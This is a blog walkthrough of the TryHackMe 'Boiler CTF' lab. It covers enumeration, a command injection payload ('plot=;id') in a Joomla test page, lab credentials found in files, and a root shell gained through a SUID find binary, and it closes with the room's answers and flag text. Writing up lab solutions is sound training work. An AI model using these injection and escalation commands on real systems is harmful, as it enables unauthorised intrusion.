---
title: "Boiler CTF"
date: 2026-07-01
category: "ctf"
excerpt: "Walkthrough of the TryHackMe Boiler CTF room - Intermediate level CTF"
image: "/images/blog/140.png"
readtime: "30 min read"
draft: false
---

# Boiler CTF

No description on this one. Just a target IP. Fine by me, let's start with the usual full port scan.

```bash
nmap -sCV -p- 10.82.165.55
```

![](/images/blog/boiler-ctf/1.png)

Four ports open, 21, 80, 10000, and 55007. Decent spread to work with.

First thing that jumps out is FTP allows anonymous login. Definitely coming back to that.

---

## Anonymous FTP

Port 80 is just a default Apache page so I'm not expecting much there yet. Started gobuster against it:

```bash
gobuster dir -u http://10.82.165.55 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
```

While that's running in one tab, I hopped into FTP with the other:

```bash
ftp 10.82.165.55
```

![](/images/blog/boiler-ctf/2.png)

Logged in anonymously and did an `ls`. Nothing showed up at first glance. Ran `ls -la` instead to catch hidden files and there's a `.info.txt`. Grabbed it:

```bash
get .info.txt
```

Opened it locally and got this:


```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

![](/images/blog/boiler-ctf/3.png)

Some kind of cipher. Threw it at a decoder and got:

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

![](/images/blog/boiler-ctf/4.png)

Cute. So somebody set up a little troll message just to waste time. Except joke's on them because gobuster had been running this whole time.

---

## Gobuster Hits

Gobuster came back with two paths, `/manual` and `/joomla`.

![](/images/blog/boiler-ctf/5.png)

The manual page is just the standard Apache manual, nothing there.

![](/images/blog/boiler-ctf/6.png)

The joomla one is an actual Joomla install, so that's clearly where the real content lives.

![](/images/blog/boiler-ctf/7.png)

I poked around both pages for a bit just to get a feel for what I was looking at, then started digging into joomla.

---

## The 20 Minute Wall

And this is where I got completely stuck. Tried brute forcing the admin panel, tried random paths, tried poking around the system, looked up CVEs for whatever Joomla version this was. Nothing. Twenty plus minutes gone and nothing so far.

When I hit a wall like that my move is always to step back and go back to basics instead of digging myself deeper into a rabbit hole that's going nowhere. So I went back and looked at the nmap results again.

Port 10000 was running webmin httpd, so I spent a bit of time researching if that specific version had anything known against it. Came up empty. Another dead end. At this point though I was pretty confident the answer was hiding somewhere inside Joomla and I'd just skimmed past it.

---

## Back Into Joomla

So I went back to basics again and started properly walking through everything gobuster had already given me under `/joomla`.

Checked `http://10.82.165.55/joomla/build/` first.

![](/images/blog/boiler-ctf/8.png)

Lots of files in there but nothing that stood out, though honestly I didn't spend a huge amount of time on it. Moved to `/tests`, same story, a lot of files and folders but nothing screaming for attention.

The one thing that did catch my eye was the `/installation` path, which showed this message:

```
Congratulations! Joomla! is now installed.
PLEASE REMEMBER TO COMPLETELY REMOVE THE INSTALLATION FOLDER.
You will not be able to proceed beyond this point until the "installation" folder has been removed. This is a security feature of Joomla!
```

![](/images/blog/boiler-ctf/9.png)

Cool message, but not exactly actionable on its own. So I kept enumerating and went to `/_test`, which felt promising just from the name.

![](/images/blog/boiler-ctf/10.png)

Ran gobuster again but scoped to `/joomla/_test` and got nothing back.

Then I tried visiting `http://10.82.165.55/joomla/_files/` directly and got handed this:

```
VjJodmNITnBaU0JrWVdsemVRbz0K
```

![](/images/blog/boiler-ctf/11.png)

Base64. Decoded it and got another base64 string:

```
V2hvcHNpZSBkYWlzeQo=
```

Decoded that too and all I got was:

```
Whopsie daisy
```

Really. Two layers of base64 just to tell me "whoopsie daisy." At this point I was fully convinced whoever built this room enjoys wasting people's time, but at least it's a fun kind of frustrating.

I ran gobuster a bit more aggressively across every interesting path I'd found so far just to make sure I wasn't missing anything else. Came back empty everywhere except `_test`, so that's officially where I'm putting all my attention.

---

## The Command Injection

Went back to `_test` and clicked the New button on the page. The URL changed to:

```
http://10.82.165.55/joomla/_test/index.php?plot=NEW
```

That `plot=` parameter looked off to me. Googled it and it turns out this specific setup is vulnerable to command injection through that param. Anything you put after a semicolon gets executed on the server.

Tested it straight away:

```
http://10.82.165.55/joomla/_test/index.php?plot=;id
```

Had to view the page source to actually see the output, but it worked. Ran `pwd` next to get my bearings, then had a look around with:

```
;ls -la
```

![](/images/blog/boiler-ctf/12.png)

Found a file called `log.txt`, and inside it was a username and password:

```
basterd : superduperp@$$
```

![](/images/blog/boiler-ctf/13.png)

Let's put those to use.

---

## Initial Foothold

```bash
ssh basterd@10.82.165.55 -p 55007
```

![](/images/blog/boiler-ctf/14.png)

And I'm in. Finally some actual progress after all that runaround.

Ran an `ls` and there's a file called `backup.sh`. Opened it up and it's got another set of credentials inside for a different user.

```
stoner : #superduperp@$$no1knows
```

![](/images/blog/boiler-ctf/15.png)

Ignore the `#` at the start, that's not part of the password. Switched user:

```bash
su stoner
```

Password `superduperp@$$no1knows` and I'm in as stoner.

---

## Privilege Escalation

Checked sudo rights first out of habit:

```bash
sudo -l
```

![](/images/blog/boiler-ctf/16.png)

Pretty sure this was just another troll and it didn't lead anywhere useful. So instead I went hunting for suid binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![](/images/blog/boiler-ctf/17.png)

And `find` itself showed up in the results. You can get a root shell straight out of a suid `find` binary:

```bash
find . -exec /bin/sh -p \; -quit
```

![](/images/blog/boiler-ctf/18.png)

Ran it and I'm root.

---

## The Flags

User flag is inside stoner's home directory but it's hidden. Needed `ls -la` to spot it.

Catting it just gives a little message:

```bash
You made it till here, well done.
```

![](/images/blog/boiler-ctf/19.png)

Root flag is the standard `/root/root.txt`, grabbed that too and the box is done.

---

#Answers

File extension after anon login `txt`

What is on the highest port? `ssh`

What's running on port 10000? `webmin`

Can you exploit the service running on that port? (yay/nay answer) `nay`

What's CMS can you access? `joomla`

The interesting file name in the folder? `log.txt`

Where was the other users pass stored(no extension, just the name)? `backup`

user.txt `You made it till here, well done.`

What did you exploit to get the privileged user? `find`

root.txt `It wasn't that hard, was it?`

---

## Takeaway

Pretty fun room start to finish. The troll messages threw me off a bit, that rot13 note and the double base64 "whoopsie daisy" were designed purely to mess with people who panic and start guessing instead of enumerating properly.

The real lesson here was the 20 minute wall. It's so easy to get tunnel vision on one thing, in my case the Joomla admin panel and webmin, and completely forget to go back and re-check what you already found. The command injection param was there under `_test` the whole time, I just hadn't looked at it properly yet.

Also a nice reminder that suid binaries are always worth checking early in priv esc. `find` with the suid bit set is about as clean a root shell as you're going to get, no exploit writing needed, just knowing the trick exists.


---

